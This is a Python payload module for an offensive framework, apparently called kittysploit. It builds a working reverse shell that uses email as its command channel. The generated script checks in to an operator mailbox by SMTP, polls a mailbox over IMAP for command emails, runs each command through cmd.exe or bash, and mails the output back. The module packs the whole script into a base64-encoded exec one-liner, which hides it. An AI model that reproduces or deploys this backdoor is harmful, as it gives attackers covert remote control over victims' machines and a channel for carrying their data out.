#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Python reverse shell over email (IMAP/SMTP).
Communicates with listeners/email/reverse_email: sends check-in, polls for commands, sends output by email.
"""

from kittysploit import *


class Module(Payload):
    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Command Shell, Reverse Email (Python)",
        "description": "Command shell over email (multi-OS: auto-detects Windows/Unix). Check-in via SMTP, receive commands via IMAP, send output via SMTP. Use with listeners/email/reverse_email.",
        "category": "singles",
        "arch": Arch.PYTHON,
        "listener": "listeners/email/reverse_email",
        "handler": Handler.REVERSE,
    }

    # Operator (C2) – where to send check-in and responses
    operator_email = OptString("", "Operator mailbox address (where listener reads)", True)

    # Victim IMAP – read command emails (operator sends commands to victim_email = imap_user)
    imap_host = OptString("imap.gmail.com", "IMAP server (victim mailbox)", True)
    imap_port = OptPort(993, "IMAP port", False)
    imap_user = OptString("", "IMAP username (victim mailbox)", True)
    imap_password = OptString("", "IMAP password or App Password", True)
    use_ssl_imap = OptBool(True, "Use SSL for IMAP", False)

    # Victim SMTP – send check-in and responses to operator
    smtp_host = OptString("smtp.gmail.com", "SMTP server (victim mailbox)", True)
    smtp_port = OptPort(587, "SMTP port", False)
    smtp_user = OptString("", "SMTP username (often same as IMAP)", True)
    smtp_password = OptString("", "SMTP password or App Password", True)
    use_ssl_smtp = OptBool(False, "Use SSL for SMTP (port 465)", False)
    use_tls_smtp = OptBool(True, "Use STARTTLS for SMTP", False)

    # Protocol
    subject_prefix = OptString("[KS]", "Subject prefix (must match listener)", False)
    checkin_subject = OptString("CHECKIN", "Check-in subject keyword", False)
    mailbox = OptString("INBOX", "IMAP mailbox to watch", False)
    poll_interval = OptInteger(30, "Seconds between IMAP polls", False)
    shell_binary = OptString("", "Shell override (empty = auto-detect: cmd.exe on Windows, /bin/bash on Unix)", False, advanced=True)
    python_binary = OptString("python3", "Python binary (python3 on Unix, python on Windows)", True, advanced=True)

    def _get_python_script(self) -> str:
        """Return the full Python backdoor script (inline)."""
        op = repr(str(self.operator_email))
        imap_h = repr(str(self.imap_host))
        imap_p = int(self.imap_port)
        imap_u = repr(str(self.imap_user))
        imap_pw = repr(str(self.imap_password))
        ssl_imap = bool(self.use_ssl_imap)
        smtp_h = repr(str(self.smtp_host))
        smtp_p = int(self.smtp_port)
        smtp_u = repr(str(self.smtp_user))
        smtp_pw = repr(str(self.smtp_password))
        ssl_smtp = bool(self.use_ssl_smtp)
        tls_smtp = bool(self.use_tls_smtp)
        prefix = repr(str(self.subject_prefix).strip() or "[KS]")
        checkin = str(self.checkin_subject).strip() or "CHECKIN"
        checkin_subj = repr("{} {}".format(str(self.subject_prefix).strip() or "[KS]", checkin))
        mbox = repr(str(self.mailbox))
        interval = max(5, int(self.poll_interval))
        shell_override = (str(self.shell_binary) or "").strip()

        return r'''
import subprocess
import time
import sys
try:
    import imaplib
    import smtplib
    from email.mime.text import MIMEText
    from email.parser import BytesParser
    from email import policy
    from email.header import decode_header
except ImportError:
    sys.exit(1)

OP = """__OP__"""
IMAP_HOST = """__IMAP_HOST__"""
IMAP_PORT = __IMAP_PORT__
IMAP_USER = """__IMAP_USER__"""
IMAP_PW = """__IMAP_PW__"""
SSL_IMAP = __SSL_IMAP__
SMTP_HOST = """__SMTP_HOST__"""
SMTP_PORT = __SMTP_PORT__
SMTP_USER = """__SMTP_USER__"""
SMTP_PW = """__SMTP_PW__"""
SSL_SMTP = __SSL_SMTP__
TLS_SMTP = __TLS_SMTP__
PREFIX = """__PREFIX__"""
CHECKIN_SUBJECT = """__CHECKIN_SUBJECT__"""
MAILBOX = """__MAILBOX__"""
POLL_INTERVAL = __POLL_INTERVAL__

if """__SHELL_OVERRIDE__""":
    SHELL = """__SHELL_OVERRIDE__"""
    SHELL_ARG = "/c" if "cmd" in SHELL.lower() or "powershell" in SHELL.lower() else "-c"
else:
    if sys.platform == "win32":
        SHELL, SHELL_ARG = "cmd.exe", "/c"
    else:
        SHELL, SHELL_ARG = "/bin/bash", "-c"

def decode_header_str(s):
    if not s:
        return ""
    try:
        parts = decode_header(s)
        out = []
        for part, enc in parts:
            if isinstance(part, bytes):
                out.append(part.decode(enc or "utf-8", errors="replace"))
            else:
                out.append(part)
        return "".join(out)
    except Exception:
        return str(s) if s else ""

def get_body(msg):
    body = ""
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_type() == "text/plain":
                try:
                    pl = part.get_payload(decode=True)
                    if pl:
                        body = pl.decode(part.get_content_charset() or "utf-8", errors="replace")
                except Exception:
                    pass
                break
    else:
        try:
            pl = msg.get_payload(decode=True)
            if pl:
                body = pl.decode(msg.get_content_charset() or "utf-8", errors="replace")
        except Exception:
            pass
    return (body or "").strip()

def send_email(to, subject, body):
    try:
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = subject
        msg["From"] = SMTP_USER
        msg["To"] = to
        if SSL_SMTP:
            with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT) as s:
                s.login(SMTP_USER, SMTP_PW)
                s.sendmail(SMTP_USER, [to], msg.as_string())
        else:
            with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as s:
                if TLS_SMTP:
                    s.starttls()
                s.login(SMTP_USER, SMTP_PW)
                s.sendmail(SMTP_USER, [to], msg.as_string())
        return True
    except Exception:
        return False

def run_cmd(cmd):
    try:
        r = subprocess.run(
            [SHELL, SHELL_ARG, cmd],
            capture_output=True,
            timeout=60,
            shell=False,
        )
        out = (r.stdout or b"").decode("utf-8", errors="replace")
        err = (r.stderr or b"").decode("utf-8", errors="replace")
        if err:
            out = out + "\n" + err
        return out.strip() or "(no output)", r.returncode
    except subprocess.TimeoutExpired:
        return "(timeout)", 1
    except Exception as e:
        return str(e), 1

def main():
    send_email(OP, CHECKIN_SUBJECT, "CHECKIN")
    seen = set()
    while True:
        try:
            if SSL_IMAP:
                conn = imaplib.IMAP4_SSL(IMAP_HOST, IMAP_PORT)
            else:
                conn = imaplib.IMAP4(IMAP_HOST, IMAP_PORT)
            conn.login(IMAP_USER, IMAP_PW)
            conn.select(MAILBOX, readonly=False)
            typ, data = conn.search(None, "UNSEEN")
            if typ != "OK" or not data[0]:
                conn.logout()
                time.sleep(POLL_INTERVAL)
                continue
            for uid in data[0].split():
                typ, msg_data = conn.fetch(uid, "(RFC822)")
                if typ != "OK" or not msg_data:
                    continue
                raw = msg_data[0][1]
                msg = BytesParser(policy=policy.default).parsebytes(raw)
                subj = decode_header_str(msg.get("Subject", ""))
                if PREFIX not in subj:
                    continue
                parts = subj.split(None, 1)
                if len(parts) < 2:
                    continue
                cmd_id = parts[1].strip()
                if not cmd_id.startswith("cmd_"):
                    continue
                if uid in seen:
                    continue
                seen.add(uid)
                body = get_body(msg)
                cmd = body.strip()
                conn.store(uid, "+FLAGS", "\\Seen")
                out, ret = run_cmd(cmd)
                reply = "CMD_ID: " + cmd_id + "\n" + out
                send_email(OP, PREFIX + " " + cmd_id, reply)
            conn.logout()
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
'''.replace("__OP__", str(self.operator_email)).replace(
            "__IMAP_HOST__", str(self.imap_host)
        ).replace("__IMAP_PORT__", str(imap_p)).replace(
            "__IMAP_USER__", str(self.imap_user)
        ).replace("__IMAP_PW__", str(self.imap_password)).replace(
            "__SSL_IMAP__", "True" if ssl_imap else "False"
        ).replace("__SMTP_HOST__", str(self.smtp_host)).replace(
            "__SMTP_PORT__", str(smtp_p)
        ).replace("__SMTP_USER__", str(self.smtp_user)).replace(
            "__SMTP_PW__", str(self.smtp_password)
        ).replace("__SSL_SMTP__", "True" if ssl_smtp else "False").replace(
            "__TLS_SMTP__", "True" if tls_smtp else "False"
        ).replace("__PREFIX__", str(self.subject_prefix).strip() or "[KS]").replace(
            "__CHECKIN_SUBJECT__", "{} {}".format(str(self.subject_prefix).strip() or "[KS]", checkin)
        ).replace("__MAILBOX__", str(self.mailbox)).replace(
            "__POLL_INTERVAL__", str(interval)
        ).replace("__SHELL_OVERRIDE__", shell_override.replace("\\", "\\\\").replace('"', '\\"'))

    def generate(self):
        operator = (str(self.operator_email) or "").strip()
        if not operator:
            print_error("operator_email is required (listener mailbox address)")
            return None
        imap_user = (str(self.imap_user) or "").strip()
        imap_pw = (str(self.imap_password) or "").strip()
        if not imap_user or not imap_pw:
            print_error("imap_user and imap_password are required (victim mailbox)")
            return None
        smtp_user = (str(self.smtp_user) or "").strip()
        smtp_pw = (str(self.smtp_password) or "").strip()
        if not smtp_user or not smtp_pw:
            print_error("smtp_user and smtp_password are required (victim mailbox)")
            return None

        import base64 as b64
        script = self._get_python_script()
        py = str(self.python_binary)
        encoded = b64.b64encode(script.encode("utf-8")).decode("ascii")
        return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
